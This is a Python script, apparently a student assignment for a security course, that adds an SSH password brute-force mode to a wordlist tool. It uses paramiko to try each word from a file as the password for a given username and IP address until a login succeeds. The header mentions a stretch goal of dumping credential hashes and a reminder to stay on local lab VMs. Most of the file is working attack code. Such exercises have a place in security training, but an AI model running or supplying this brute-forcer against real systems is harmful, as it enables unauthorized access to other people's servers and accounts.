#!/usr/bin/env python3

# Script Name:                  
# Author:                       Raphael Chookagian
# Date of latest revision:      08/1/2023
# Purpose:                      Create a python script:
# Add to your Python brute force tool the capability to:
# * Authenticate to an SSH server by its IP address.
#   * Assume the username and IP are known inputs and attempt each word on the provided word list until successful login takes place.
# *Note: Stay out of trouble! Restrict this kind of traffic to your local network VMs.*
# ## Stretch Goals (Optional Objectives)
# Add to your Python brute force tool the capability to:
# * Dump the user credential hashes of the victim system and print them to the screen.

# import libraries
import time
import getpass
# Install paramiko before running
import paramiko



# Declare functions

# Create
def Off(file_path, delay=1):
    with open(file_path, 'r') as file:
        for line in file:
            word = line.strip()
            print(word)
            # delay
            time.sleep(delay)

def Def(file_path, target_word):
    with open(file_path, 'r') as file:
        for line in file:
            word = line.strip()
            if word == target_word:
                print(f"'{target_word}' match found in list.")
                return
    print(f"'{target_word}' no match found in list.")


def SSHBru(file_path, username, ip_address):
    with open(file_path, 'r') as file:
        for line in file:
            password = line.strip()
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                client.connect(ip_address, username=username, password=password)
                print(f"Successful login with password: {password}")
                client.close()
                return
            except paramiko.AuthenticationException:
                print(f"Failed login with password: {password}")
                continue
    print("No successful login found.")


def main():
    while True:
        print("1: Offensive")
        print("2: Defensive")
        print("3: SSH Bruteforce")
        print("0: Exit")
        mode = int(input("Select task (0 to exit): "))
        
        if mode == 1:
            file_path = input("Enter file path (wordlist): ")
            Off(file_path)
        elif mode == 2:
            file_path = input("Enter (wordlist) file path: ")
            target_word = getpass.getpass("Enter target word: ")
            Def(file_path, target_word)
        elif mode == 3:
            file_path = input("Enter (wordlist) file path: ")
            username = input("Enter username: ")
            ip_address = input("Enter IP address: ")
            SSHBru(file_path, username, ip_address)
        elif mode == 0:
            break
        else:
            print("Invalid, please select an available mode")


# Main

if __name__ == "__main__":
    main()

# End
